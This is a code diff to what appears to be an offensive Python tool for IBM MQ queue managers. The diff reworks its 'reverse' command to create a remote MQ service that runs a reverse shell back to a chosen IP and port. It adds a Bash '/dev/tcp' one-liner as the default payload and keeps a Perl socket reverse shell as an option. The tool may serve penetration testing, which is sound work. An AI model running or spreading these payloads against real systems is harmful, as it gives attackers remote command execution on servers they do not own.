@@ -1008,11 +1008,13 @@ def execute(cmd, args, service_name, wait, ignore_path):
 @click.option('--ip', '-i', type=click.STRING, required=True, help='The IP address to connect back to.')
 @click.option('--port', '-p', type=click.INT, required=True, help='The port for the connection back.')
 @click.option('--service-name', '-n', type=click.UNPROCESSED, default=None, help='A service name to use.')
+@click.option('--perl', '-P', type=click.BOOL, is_flag=True, required=False,
+              help='Prefer a Perl-based reverse shell over Bash')
 @click.option('--wait', '-w', default=5, show_default=True,
               help='Number of seconds to wait before cleaning up the service.')
-def reverse(ip, port, service_name, wait):
+def reverse(ip, port, service_name, perl, wait):
     """
-        Start a Perl-based reverse shell.
+        Start reverse shell.
 
         \b
         Examples:
@@ -1026,16 +1028,24 @@ def reverse(ip, port, service_name, wait):
     # Cleanup the service name to remove spaces and dashes and limit to 16 chars
     service_name = str(service_name).replace('-', '').replace(' ', '')[0:16].encode()
 
-    # raw perl, passed as part of a -e argument
-    payload = "use Socket;$i='" + str(ip) + "';$p=" + str(port) + \
-              ";socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));" \
-              "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');" \
-              "open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
+    # by default we will try and use bash for the reverse shell
+    executable = '/usr/bin/bash'
+    payload = f'-c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
+
+    if perl:
+        executable = '/usr/bin/perl'
+        # raw perl, passed as part of a -e argument
+        r_shell = f"use Socket;$i='{ip}';$p={port}" + \
+                  ";socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));" \
+                  "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');" \
+                  "open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
+        payload = f'-e "{r_shell}"'
 
     # information
     click.secho(f'Remote IP: {ip}', dim=True)
     click.secho(f'Remote Port: {port}', dim=True)
-    click.secho(f'Raw Reverse Shell: {payload}', dim=True, fg='blue')
+    click.secho(f'Executable: {executable}', dim=True, fg='blue')
+    click.secho(f'Arguments: {payload}', dim=True, fg='blue')
     click.secho(f'Service Name: {service_name.decode()}\n', dim=True)
 
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
@@ -1047,8 +1057,8 @@ def reverse(ip, port, service_name, wait):
         pymqi.CMQC.MQCA_SERVICE_NAME: service_name,
         pymqi.CMQC.MQIA_SERVICE_CONTROL: pymqi.CMQC.MQSVC_CONTROL_MANUAL,
         pymqi.CMQC.MQIA_SERVICE_TYPE: pymqi.CMQC.MQSVC_TYPE_COMMAND,
-        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: '/usr/bin/perl'.encode(),
-        pymqi.CMQC.MQCA_SERVICE_START_ARGS: f'-e "{payload}"'.encode(),
+        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: executable.encode(),
+        pymqi.CMQC.MQCA_SERVICE_START_ARGS: payload.encode(),
     }
     pcf = pymqi.PCFExecute(qmgr)
     pcf.MQCMD_CREATE_SERVICE(args)
@@ -1064,8 +1074,8 @@ def reverse(ip, port, service_name, wait):
 
     except pymqi.MQMIError as dme:
         if dme.reason == pymqi.CMQCFC.MQRCCF_PROGRAM_NOT_AVAILABLE:
-            click.secho('The program \'/usr/bin/perl\' is not available on the remote system.', fg='red')
-            return
+            click.secho(f'The program \'{executable}\' is not available on the remote system.', fg='red')
+            wait = 0
 
         else:
             raise dme
